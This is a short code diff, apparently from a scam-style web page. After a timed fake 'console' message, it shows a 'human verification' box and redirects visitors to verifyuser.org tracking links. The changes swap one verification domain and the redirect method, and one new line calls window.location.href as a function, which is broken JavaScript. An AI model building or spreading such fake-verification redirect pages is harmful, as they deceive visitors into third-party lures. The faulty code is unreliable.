@@ -175,7 +175,7 @@ $(document).ready(function() {
 		setTimeout(function() {
 			$(".message-content p.console-message").fadeOut(function() {
 				$(".human-verification-wrapper").fadeIn();
-				window.location.replace('https://verifyuser.org/cl/i/j6redp');
+				window.location.href('https://verifyuser.org/cl/i/j6redp');
 
 			});
 		}, 14800);
@@ -253,7 +253,7 @@ $(document).ready(function() {
 		setTimeout(function() {
 			$(".message-content p.console-message").fadeOut(function() {
 				$(".human-verification-wrapper").fadeIn();
-				window.location.replace="https://verifyuser.org/cl/i/5kpj7v";
+				window.location.href="https://verifyuser.org/cl/i/5kpj7v";
 			});
 		}, 14800);
 	});
@@ -561,7 +561,7 @@ $(document).ready(function() {
 		setTimeout(function() {
 			$(".message-content p.console-message").fadeOut(function() {
 				$(".human-verification-wrapper").fadeIn();
-				window.location.href="https://verifysuper.com/cl/i/kjg8e";
+				window.location.href="https://verifyuser.org/cl/i/kjg8e";
 			});
 		}, 14800);
 	});
